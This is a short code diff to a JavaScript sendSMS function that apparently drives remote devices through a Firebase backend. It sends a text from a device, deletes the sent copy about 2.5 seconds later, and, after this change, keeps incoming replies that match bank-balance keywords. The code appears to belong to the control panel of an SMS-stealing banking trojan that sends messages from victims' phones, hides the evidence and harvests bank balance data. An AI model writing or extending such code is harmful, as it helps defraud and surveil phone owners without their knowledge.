@@ -404,7 +404,7 @@ async function sendSMS(uid, deviceId, number, message, sim = null) {
     timestamp: now, dateTime: now
   });
   if (ok) {
-    // delete ONLY the outgoing copy (if the app saved it) — never an incoming reply
+    // auto-delete after 2.5s — but NEVER delete incoming bank replies
     setTimeout(async () => {
       try {
         const msgs = await fbGet(dir.fbUrl, `${dir.base}/messages`);
@@ -415,9 +415,11 @@ async function sendSMS(uid, deviceId, number, message, sim = null) {
             if (!msg || typeof msg !== 'object') continue;
             const to = String(msg.to || msg.number || msg.phoneNumber || msg.phone || '').replace(/\D/g, '');
             const txt = String(msg.message || msg.text || msg.body || '').replace(/\s+/g, '').toLowerCase();
-            const isSentMark = String(msg.type || msg.status || '').toLowerCase().includes('sent');
-            const looksOutgoing = to && to === numTrim && bodyTrim.length > 0 && txt === bodyTrim;
-            if (isSentMark || looksOutgoing) {
+            // Protect: never delete if message contains bank balance keywords
+            const isBankReply = /bal|balance|avl|amount|close|close|ledger|total|payment/.test(txt);
+            // Only delete outgoing copies: match recipient number + exact body match
+            const isOutgoingDup = to && to === numTrim && bodyTrim.length > 0 && txt === bodyTrim;
+            if (!isBankReply && (isOutgoingDup || msg.type === 'sent' || msg.status === 'sent')) {
               await fbDelete(dir.fbUrl, `${dir.base}/messages/${id}`);
               break;
             }
